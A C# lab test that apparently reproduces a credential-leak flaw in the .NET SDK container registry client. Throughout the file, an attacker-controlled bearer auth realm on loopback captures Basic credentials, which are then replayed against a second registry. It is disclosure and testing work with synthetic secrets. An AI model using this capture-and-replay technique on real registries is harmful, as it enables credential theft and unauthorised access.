// Scope/replay impact test for attacker-directed OCI bearer realms.
// All participants are independent loopback HTTPS services and all credentials are synthetic.
// This tests impact only if credentials obtained from registry A are ALSO valid at registry B.
using System.Collections.Concurrent;
using System.Net;
using System.Net.Http.Headers;
using System.Reflection;
using System.Runtime.Loader;
using System.Text;
using System.Text.Json;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging.Abstractions;

static class CrossRegistryScopeLab
{
    const string User="SYNTH_GLOBAL_REGISTRY_USERNAME";
    const string Pass="SYNTH_GLOBAL_REGISTRY_PASSWORD";
    const string Wrong="DIFFERENT_REGISTRY_PASSWORD";
    const string Token="SYNTH_ATTESTATION_TOKEN";
    const string Canary="SYNTH_PRIVILEGED_REGISTRY_B_CANARY";
    static readonly string Sdk=Environment.GetEnvironmentVariable("SDK_VER")??"unknown";
    static readonly List<object> Results=[];
    static string Basic(string pwd)=>"Basic "+Convert.ToBase64String(Encoding.UTF8.GetBytes(User+":"+pwd));
    static async Task Reply(HttpContext c,int code,string? body=null,string? challenge=null)
    {
        c.Response.StatusCode=code;
        if(challenge is not null)c.Response.Headers.WWWAuthenticate=challenge;
        if(body is not null){c.Response.ContentType="application/json";await c.Response.WriteAsync(body);}
    }
    public static async Task RunAsync()
    {
        string[] environmentNames=["DOTNET_CONTAINER_PUSH_REGISTRY_UNAME","DOTNET_CONTAINER_PUSH_REGISTRY_PWORD",
            "DOTNET_CONTAINER_REGISTRY_UNAME","DOTNET_CONTAINER_REGISTRY_PWORD","REGISTRY_AUTH_FILE","DOCKER_CONFIG"];
        var old=environmentNames.ToDictionary(n=>n,Environment.GetEnvironmentVariable);
        var oldProxy=HttpClient.DefaultProxy;
        HttpClient.DefaultProxy=new WebProxy();
        bool pass=false;
        try{pass=await RunImpact();}
        finally
        {
            foreach(var v in old)Environment.SetEnvironmentVariable(v.Key,v.Value);
            HttpClient.DefaultProxy=oldProxy;
            Directory.CreateDirectory("REPRODUCTION-EVIDENCE");
            File.WriteAllText("REPRODUCTION-EVIDENCE/sdk-"+Sdk+"-cross-registry-scope.json",
                JsonSerializer.Serialize(new{sdk=Sdk,tests=Results},new JsonSerializerOptions{WriteIndented=true}));
        }
        if(!pass)throw new Exception("Cross-registry credential-scope assertion failed");
    }
    static object Api(string hostPort)
    {
        string sdkPath=Environment.GetEnvironmentVariable("DOTNET_SDK_CONTAINER_ASSEMBLY")!;
        var asm=AssemblyLoadContext.Default.LoadFromAssemblyPath(Path.GetFullPath(sdkPath));
        var type=asm.GetType("Microsoft.NET.Build.Containers.DefaultRegistryAPI",true)!;
        var mode=asm.GetType("Microsoft.NET.Build.Containers.RegistryMode",true)!;
        return Activator.CreateInstance(type,BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Instance,
            null,[hostPort,new Uri("https://"+hostPort+"/"),false,NullLogger.Instance,Enum.Parse(mode,"Push")],null)!;
    }
    static async Task<bool> ManifestGet(object api)
    {
        object manifest=api.GetType().GetProperty("Manifest")!.GetValue(api)!;
        try
        {
            if(Sdk.StartsWith("10."))
            {
                var task=(Task<HttpResponseMessage>)manifest.GetType().GetMethod("GetAsync")!.Invoke(manifest,["public/demo","latest",CancellationToken.None])!;
                using var r=await task;
                return r.IsSuccessStatusCode;
            }
            else
            {
                var task=(Task<bool>)manifest.GetType().GetMethod("ExistsAsync")!.Invoke(manifest,["public/demo","latest",CancellationToken.None])!;
                return await task;
            }
        }
        catch{return false;}
    }
    static async Task<bool> RunImpact()
    {
        Environment.SetEnvironmentVariable("DOTNET_CONTAINER_PUSH_REGISTRY_UNAME",User);
        Environment.SetEnvironmentVariable("DOTNET_CONTAINER_PUSH_REGISTRY_PWORD",Pass);
        Environment.SetEnvironmentVariable("DOTNET_CONTAINER_REGISTRY_UNAME",null);
        Environment.SetEnvironmentVariable("DOTNET_CONTAINER_REGISTRY_PWORD",null);
        string? captured=null;
        var evidence=new ConcurrentQueue<object>();
        await using var credentialCollector=await LocalEndpoint.Start("127.0.0.2",async c=>
        {
            string authorization=c.Request.Headers.Authorization.ToString();
            if(authorization==Basic(Pass))captured=authorization;
            evidence.Enqueue(new{role="attacker-controlled-auth-realm",method=c.Request.Method,
                matchingSyntheticCredential=authorization==Basic(Pass)});
            await Reply(c,200,JsonSerializer.Serialize(new{token=Token,expires_in=120}));
        },tls:true);
        string realm="https://privateauth.lab.test:"+credentialCollector.Port+"/auth";
        await using var firstRegistry=await LocalEndpoint.Start("127.0.0.1",async c=>
        {
            string auth=c.Request.Headers.Authorization.ToString();
            evidence.Enqueue(new{role="untrusted-registry-A",method=c.Request.Method,bearer=auth=="Bearer "+Token});
            if(auth=="Bearer "+Token)await Reply(c,200,"{}");
            else await Reply(c,401,challenge:"Bearer realm=\""+realm+"\",service=\"synthetic-A\"");
        },tls:true);
        bool equivalentCredentialsAccepted=true;
        int authorizedReads=0;
        int authorizedWrites=0;
        await using var separateRegistry=await LocalEndpoint.Start("127.0.0.3",async c=>
        {
            string auth=c.Request.Headers.Authorization.ToString();
            bool allowed=auth==Basic(equivalentCredentialsAccepted?Pass:Wrong);
            evidence.Enqueue(new{role="independently-authorized-registry-B",method=c.Request.Method,
                authenticated=allowed,sameSyntheticCredentialConfigured=equivalentCredentialsAccepted});
            if(!allowed)await Reply(c,403);
            else if(c.Request.Method=="GET"){Interlocked.Increment(ref authorizedReads);await Reply(c,200,JsonSerializer.Serialize(new{canary=Canary}));}
            else if(c.Request.Method=="PUT")await Reply(c,403); // read-only permission control
            else await Reply(c,405);
        },tls:true);
        bool triggered=await ManifestGet(Api("registry.lab.test:"+firstRegistry.Port));
        async Task<(int,bool)> Replay(HttpMethod method)
        {
            if(captured is null)return (0,false);
            using var client=new HttpClient(new HttpClientHandler{UseProxy=false});
            using var request=new HttpRequestMessage(method,"https://third.lab.test:"+separateRegistry.Port+"/v2/other-repo/manifests/latest");
            request.Headers.Authorization=AuthenticationHeaderValue.Parse(captured);
            using var response=await client.SendAsync(request);
            string body=await response.Content.ReadAsStringAsync();
            return ((int)response.StatusCode,body.Contains(Canary,StringComparison.Ordinal));
        }
        var sharedGet=await Replay(HttpMethod.Get);
        var sharedPut=await Replay(HttpMethod.Put);
        equivalentCredentialsAccepted=false;
        var differentPassword=await Replay(HttpMethod.Get);
        bool pass=triggered && captured==Basic(Pass) && sharedGet==(200,true) &&
            sharedPut.Item1==403 && differentPassword.Item1==403 &&
            authorizedReads==1 && authorizedWrites==0;
        var report=new{scenario="cross-registry-credential-replay-scope",
            passed=pass,sdk=Sdk,registryAChallengeCompleted=triggered,
            separateRealmReceivedSyntheticBasic=captured==Basic(Pass),
            protectedRegistryBSharedPasswordReadStatus=sharedGet.Item1,
            protectedRegistryBReturnedSyntheticCanary=sharedGet.Item2,
            protectedRegistryBReadonlyWriteDenied=sharedPut.Item1==403,
            protectedRegistryBDifferentPasswordDenied=differentPassword.Item1==403,
            authorizedReadCount=authorizedReads,authorizedWriteCount=authorizedWrites,
            trace=evidence.ToArray()};
        Results.Add(report);
        Console.WriteLine("[SCOPE "+Sdk+"] "+JsonSerializer.Serialize(report));
        return pass;
    }
}
